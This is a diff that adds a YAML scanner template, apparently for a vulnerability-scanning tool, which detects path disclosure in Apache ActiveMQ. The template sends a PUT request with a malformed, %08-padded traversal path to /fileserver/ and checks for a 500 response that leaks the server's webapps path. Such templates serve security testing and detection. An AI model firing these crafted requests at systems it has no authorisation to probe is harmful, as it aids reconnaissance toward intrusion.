@@ -1,0 +1,16 @@
+id: activemq-path-disclosure
+
+info:
+  name: ActiveMQ Path Disclosure
+  author: zan8in
+  severity: info
+  verified: true
+  description: app="APACHE-ActiveMQ" && title=="Apache ActiveMQ"
+
+rules:
+  r0:
+    request:
+      method: PUT
+      path: /fileserver/a../../%08/..%08/.%08/%08\\
+    expression: response.status == 500 && (response.raw.bcontains(b'\\webapps\\fileserver\\') || response.raw.bcontains(b'/webapps/fileserver/'))
+expression: r0()
